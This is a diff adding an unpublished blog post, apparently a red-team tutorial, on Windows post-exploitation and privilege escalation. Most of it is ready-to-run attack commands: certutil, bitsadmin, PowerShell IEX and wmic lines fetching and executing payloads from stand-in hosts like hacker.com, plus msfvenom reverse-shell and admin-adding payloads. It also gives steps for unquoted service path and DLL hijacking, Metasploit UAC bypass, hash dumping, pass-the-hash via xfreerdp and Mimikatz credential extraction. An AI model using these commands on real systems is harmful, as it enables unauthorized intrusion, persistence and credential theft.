@@ -1,0 +1,381 @@
+---
+layout: post
+published: false
+title: ''
+---
+## Windows Manual Escalation
+
+## Introduction
+
+In this blog post we will discusse some manual techniques to escalate privileges according to get standard privilege in target network.
+
+
+**Windows File Transfer utilities**
+
+We will discuss some utilities to downlaod remote payloads and execute them in order to perform malicious action, in target system.
+
+
+**Certutil**
+
+Certutil is a CLI program that can be used to dump and display certificate authority (CA), configuration information, configures Certificate Services, backup and restore CA components, and verify certificates, key pairs, and certificate chains. It is installed as a part of Certificate Services.
+
+How can we use it to download malicious files and evade antivirus in target system
+
+Simple command to download malicious files and payloads from remote server.
+
+**You can create payloads using msfvenom, veil, evilgrade or other tools**
+
+```
+certutil -urlcache -split -f http://hacker.com/malicious.exe malicious.exe
+```
+-URLCache: To display or delete URL cache entries
+
+-split: To split embedded ASN.1 element & Save to files
+
+-f: Force Overwrite
+
+
+
+To download encrypted payload from remote server in target and executing it as .exe.
+~~~
+certutil -urlcache -split -f http://webserver/malicious.b64 malicious.b64 & certutil -decode malicious.b64 malicious.exe & malicious.exe
+~~~
+
+Download encoded payload, decoding it and combining some commands in one line, with the InstallUtil.exe executing a specific DLL as a payload.
+
+```
+certutil -urlcache -split -f http://hacker/malicious.b64 malicious.b64 & certutil -decode malicious.b64 malicious.dll & C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil /logfile= /LogToConsole=false /u malicious.dll
+```
+
+**Bitsadmin**
+
+Background Intelligent Transfer Service is a component of Microsoft Windows XP and later iterations of the operating systems, which facilitates asynchronous, prioritized, and throttled transfer of files between machines using idle network bandwidth.
+
+To download files from remote server
+
+```
+bitsadmin /transfer hacker http://hacker.com/evil.pe c:\System32\evil.exe
+```
+We can also execute payload using bitsadmin
+```
+bitsadmin /addfile hacker http://hacker.com/evil.pe c:\System32\evil.exe
+bitsadmin /SetNotifyCmdLine evil.exe /complete hacker | start /B C:\evil.exe"
+
+**Cscript**
+
+cscript.exe is a Microsoft (r) Console Based Script Host from Microsoft Corporation belonging to Microsoft (r) Windows Script Host. With Cscript.exe, you can run scripts by typing the name of a script file at the command prompt.
+
+~~~
+cscript //E:jscript \\webdavserver\folder\payload.txt
+~~~
+
+
+Create Vbs file for wget
+**VbScript wget.vbs**
+```
+
+echo strUrl = WScript.Arguments.Item(0) > wget.vbs 
+echo StrFile = WScript.Arguments.Item(1) >> wget.vbs 
+echo Const HTTPREQUEST_PROXYSETTING_DEFAULT = 0 >> wget.vbs 
+echo Const HTTPREQUEST_PROXYSETTING_PRECONFIG = 0 >> wget.vbs 
+echo Const HTTPREQUEST_PROXYSETTING_DIRECT = 1 >> wget.vbs 
+echo Const HTTPREQUEST_PROXYSETTING_PROXY = 2 >> wget.vbs echo Dim http,varByteArray,strData,strBuffer,lngCounter,fs,ts >> wget.vbs 
+echo Err.Clear >> wget.vbs echo Set http = Nothing >> wget.vbs 
+echo Set http = CreateObject("WinHttp.WinHttpRequest.5.1") >> wget.vbs 
+echo If http Is Nothing Then Set http = CreateObject("WinHttp.WinHttpRequest") >> wget.vbs 
+echo If http Is Nothing Then Set http = CreateObject("MSXML2.ServerXMLHTTP") >> wget.vbs 
+echo If http Is Nothing Then Set http = CreateObject("Microsoft.XMLHTTP") >> wget.vbs 
+echo http.Open "GET",strURL,False >> wget.vbs echo http.Send >> wget.vbs 
+echo varByteArray = http.ResponseBody >> wget.vbs echo Set http = Nothing >> wget.vbs 
+echo Set fs = CreateObject("Scripting.FileSystemObject") >> wget.vbs 
+echo Set ts = fs.CreateTextFile(StrFile,True) >> wget.vbs echo strData = "" >> wget.vbs 
+echo strBuffer = "" >> wget.vbs echo For lngCounter = 0 to UBound(varByteArray) >> wget.vbs 
+echo ts.Write Chr(255 And Ascb(Midb(varByteArray,lngCounter + 1,1))) >> wget.vbs 
+echo Next >> wget.vbs echo ts.Close >> wget.vbs
+```
+And excute it 
+
+```
+cscript wget.vbs http://attackerIP/hacker.exe hacker.exe
+```
+
+** Powershell IEX**
+
+```
+powershell -exec bypass -c "(New-Object Net.WebClient).Proxy.Credentials=[Net.CredentialCache]::DefaultNetworkCredentials;iwr('http://webserver/payload.ps1')|iex"
+
+```
+
+**Wmic**
+
+```
+wmic os get /format:"https://hacker/hacker.xsl"
+```
+
+**SMB**
+
+```
+smbclient //server/share -c 'cd c:/remote/path ; put local-file remote-file'
+```
+
+Starting the server in attacker linux using impacket
+```
+smbserver.py shareName sharePath
+```
+In the windows target machine
+~~~
+C:\>net use /d \\[host]\[share name]
+~~~
+
+**If you're in meterpreter shell, you can do many things very easily, it has many commands and run modules**
+
+To see commands in meterpreter 
+
+``
+help
+``
+
+To see run commands
+
+``
+run <Tab> <Tab>
+``
+To upload payload or malicious files in windows system by meterpreter
+
+``
+upload <filename>
+``
+
+
+**There are many other utilities also that we can use to transfer files in windows system**
+
+After Exploitation and PostEnumeration, the question arise what we found
+
+* Had we found any kernel exploit for target system?
+* Had we found Unquoted Service Paths?
+* Had we found credentials or hashes?
+* Had we found any service running on local host?
+* Had we found public exploit for any service?
+* Had we found Insecure Registry permissions?
+* Had we found sessions VNC/RDP/Citrix, so that we can try UAC bypasses? 
+* what permissions we have?
+* ETC.
+
+
+**Migrate meterpreter shell to another process**
+
+To migrate your current meterpreter session to another process to establish a stable session
+
+```
+run post/windows/manage/migrate
+```
+Or in meterpreter shell
+```
+migrate <PID>
+```
+
+**Easy Way To get a system shell**
+
+In meterpreter shell there is command by which you can get system shell simple
+
+```
+getsystem
+```
+It try's all available techniques to get system shell on target system.
+
+To specify a particular technique
+
+```
+getsystem -t 1
+```
+Here '-t' is for techniques
+
+
+**Exploit Unquoted Path Service**
+
+This technique is used to exploit PE(Portable Executable) that has a space in the filename and the file name is not enclosed in quote tags (“”) and we have write permissions, we can also replace that executable.
+
+
+
+First we have to enter windows shell to execute cmd commands
+```
+shell
+```
+After enumerating an Unquoted Path Service using **Post Enumeration Command**
+```
+wmic service get name,displayname,pathname,startmode |findstr /i "Auto" |findstr /i /v "C:\Windows\\" |findstr /i /v """
+```
+And we have found a service name 'Exploitme.exe'
+
+
+**We will create a msfvenom payload to replace that vulnerable PE**
+
+```
+msfvenom -p windows/meterpreter/reverse_tcp lhost=<AttackerIP> lport=<port> prependmigrate=true prependmigrateprocess=explorer.exe -f exe > /root/home/Desktop/Exploitme.exe
+```
+Or we can also create a payload to directly change a user to administrator
+```
+msfvenom -p windows/exec CMD='net localgroup administrators boss /add' -f exe > /root/home/Desktop/Exploitme.exe
+```
+
+In target shell
+
+```
+move Exploitme.exe Exploitme.exe.1
+upload /root/Desktop/Exploitme.exe 
+
+```
+reboot
+```
+or 
+```
+sc stop "Exploitme.exe"
+```
+```
+sc start "Exploitme.exe"
+```
+
+And start your multi/handler listener to get system shell
+
+```
+use exploit/multi/handler
+msf exploit(multi/handler) set payload windows/meterpreter/reverse_tcp
+msf exploit(multi/handler) set lhost <targetIP>
+msf exploit(multi/handler) set lport <port>
+msf exploit(multi/handler) exploit
+```
+
+## DLL Hijacking
+
+Whenever an applications started in windows it look for DLL's(Dynamic link libraries) because it contains data, code, or resources needed for the running of applications.
+
+Whenever application look need to load DLL, it will look for
+
+* The directory from which the application is loaded
+* C:\Windows\System32
+* C:\Windows\System
+* C:\Windows
+* The current working directory
+* Directories in the system PATH environment variable
+* Directories in the user PATH environment variable
+
+What if we replace our malicious DLL in the path, whenever application look for DLL, it will execute malicious payload DLL that will give us reverse shell.
+
+
+First we have to identify case of a process in which an application look for executables using [process monitor](https://docs.microsoft.com/en-us/sysinternals/downloads/procmon) tool
+
+
+We got a service name 'Hijackme.exe' which is looking for hacker.dll
+
+Lets exploit DLL hijacking
+
+Create a dll payload using msfvenom
+```
+msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=<AttackerIP> -f dll>hacker.dll
+```
+upload payload on target system and locate it on the dll way.
+
+After that start multi/handler on attacker system and exploit.
+
+Boom!!! 
+
+You will get a shell as an administrator.
+
+
+Using meterpreter there is also feature called 'Incoginito' we can impersonate other valid user tokens on that machine and became that user.
+
+In meterpreter shell use command below
+```
+use incoginito
+```
+
+
+**UAC Bypass Using Meterpreter**
+
+User Account Control or UAC for short is a security feature of Windows which helps prevent unauthorized changes to the operating system.
+
+Let's check UAC enabled or not on the target system
+
+Use metasploit module
+```
+post/windows/gather/win_privs 
+```
+
+After confirming let's bypass it.
+
+```
+search bypassuac
+```
+
+There are many exploits choose as per your requirement
+```
+exploit/windows/local/bypassuac_comhijack
+```
+
+Set options and exploit and you will get a  shell as admin
+
+
+**Pass The Hash**
+
+Pass The Hash is the technique by which you can exploit a sytem directly by its LM Hash.
+
+If you're in meterpreter shell you can run commands below
+
+```
+run hashdump
+```
+or smarthashdump like
+
+```
+post/windows/gather/smart_hashdump
+```
+Or you can search another techniques in metasploit
+
+```
+search hashdump
+```
+Choose what you need 
+
+And if you are in regular netcat or cryptcat shell upload secretdump.py, Impacket's module and execute it on target system, it will get you hash.
+
+Now you can use psexec.py and wmiexec.py to get system access, please check impacket blogpost to know this approach..
+
+Metasploit also have psexec, search for it set options  and exploit it.
+
+You will also can get rdp access using hash.
+
+**xfreerdp**
+
+Check xfreerdp in your system or install it.
+
+```
+xfreerdp --help
+```
+
+And use pass the hash technique
+
+```
+xfreerdp /u:victim /d:Target /pth: <HASH> /v:<victimIP>
+```
+We can also use [Mimikatz](https://github.com/gentilkiwi/mimikatz) which allow us to to extract plaintext password, Kerberos tickets, perform pass-the-hash attacks and much more.
+
+You can also load it on meterpreter shell
+```
+load mimikatz
+```
+And run
+```
+wdigest
+```
+
+
+
+
+
+
+## Conclusion
+
+**_In this blogpost we have discussed some basic windows post exploitation techniques, more we will learn in Red Teaming series_**
+
+
+
